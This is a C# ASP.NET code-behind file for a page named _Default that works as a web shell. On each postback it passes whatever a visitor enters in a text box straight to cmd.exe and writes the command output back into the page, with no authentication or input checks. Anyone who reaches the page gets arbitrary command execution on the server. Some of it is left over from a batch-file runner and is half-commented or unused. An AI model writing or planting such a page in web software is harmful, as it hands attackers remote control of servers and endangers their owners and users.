using System;
using System.Data;
using System.Configuration;
using System.Collections;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;

public partial class _Default : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        if(Page.IsPostBack)
        {
            
    string exec = TextBox1.Text;
    // Get the full file path
    string strFilePath = Server.MapPath("fine.bat");

    // Create the ProcessInfo object
    System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo("cmd.exe");
    psi.UseShellExecute = false;
    psi.RedirectStandardOutput = true;
    psi.RedirectStandardInput = true;
    psi.RedirectStandardError = true;


    // Start the process
    System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi);

    // Open the batch file for reading

    //System.IO.StreamReader strm = System.IO.File.OpenText(strFilePath);
    System.IO.StreamReader strm = proc.StandardError;
    // Attach the output for reading
    System.IO.StreamReader sOut = proc.StandardOutput;

    // Attach the in for writing
    System.IO.StreamWriter sIn = proc.StandardInput;

    // Write each line of the batch file to standard input
    /*while(strm.Peek() != -1)
    {
      sIn.WriteLine(strm.ReadLine());
  
    }*/
    sIn.WriteLine(exec);

    strm.Close();


    // Exit CMD.EXE
    string stEchoFmt = "# {0} run successfully. Exiting";

    sIn.WriteLine(String.Format(stEchoFmt, strFilePath));
    sIn.WriteLine("EXIT");

    // Close the process
    proc.Close();

    // Read the sOut to a string.
    string results = sOut.ReadToEnd().Trim();

    // Close the io Streams;
    sIn.Close();
    sOut.Close();

    // Write out the results.
    string fmtStdOut = "<font face=courier size=0>{0}</font>";
    this.Response.Write("<br>");
    this.Response.Write("<br>");
    this.Response.Write("<br>");
    this.Response.Write(String.Format(fmtStdOut, results.Replace(System.Environment.NewLine, "<br>")));

}
        }


    }

